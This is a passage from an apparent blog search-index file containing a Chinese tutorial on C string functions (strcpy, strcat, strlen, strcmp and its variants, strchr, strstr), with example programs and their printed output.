punctuation">&#123;</span><span class="token string">"world"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> s3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"empty"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>s3<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//strcpy()，复制字符串s2的内容到s1</span><span class="token function">strcat</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//strcat()，连接字符串s3到s1的结尾处</span>i<span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//strlen()，返回字符串s1的长度,不含null符</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">11</span>hello_world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="实例2（-strcmp-）"><a href="#实例2（-strcmp-）" class="headerlink" title="实例2（ strcmp() ）"></a>实例2（ strcmp() ）</h4><h5 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ABC"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"AbC"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"B = %d and b = %d\n"</span><span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出B和b的ASCII值</span>j <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"strcmp(ABC,AbC) = %d\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//比较</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">B <span class="token operator">=</span> <span class="token number">66</span> and b <span class="token operator">=</span> <span class="token number">98</span><span class="token function">strcmp</span><span class="token punctuation">(</span>ABC<span class="token punctuation">,</span>AbC<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="strcmp-的一些变体"><a href="#strcmp-的一些变体" class="headerlink" title="strcmp()的一些变体"></a>strcmp()的一些变体</h5><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>strcmp()</td><td>对两个字符串进行大小写敏感的比较</td></tr><tr><td>strcmpi()</td><td>对两个字符串进行大小写不敏感的比较</td></tr><tr><td>stricmp()</td><td>同strcmpi()</td></tr><tr><td>strncmp(s1,s2,n)</td><td>把s1和s2进行比较，最多比较前 <strong>n</strong> 个字节(大小写敏感)</td></tr><tr><td>strnicmp(s1,s2,n)</td><td>把s1和s2进行比较，最多比较前 <strong>n</strong> 个字节(大小写<strong>不</strong>敏感)</td></tr></tbody></table><p>如，如果将实例2中的strcmp(s1,s2)改成strmpi(s1,s2),则会返回 <strong>0</strong></p><p>其他同理</p><h4 id="实例3（-strchr-，strstr-）"><a href="#实例3（-strchr-，strstr-）" class="headerlink" title="实例3（ strchr() ，strstr() ）"></a>实例3（ strchr() ，strstr() ）</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">char</span> m<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"https://mark0519.github.io/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">char</span> s1<span class="token operator">=</span><span class="token char">'.'</span><span class="token punctuation">;</span>   <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"mark"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>   <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>      p1<span class="token operator">=</span><span class="token function">strchr</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>   p2<span class="token operator">=</span><span class="token function">strstr</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The bytes after the '.' is %s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//输出结果会包含“.”</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The bytes after the 'mark' is %s"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">The bytes after the <span class="token char">'.'</span> is <span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span>The bytes after the <span class="token char">'mark'</span> is mark0519<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> str </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
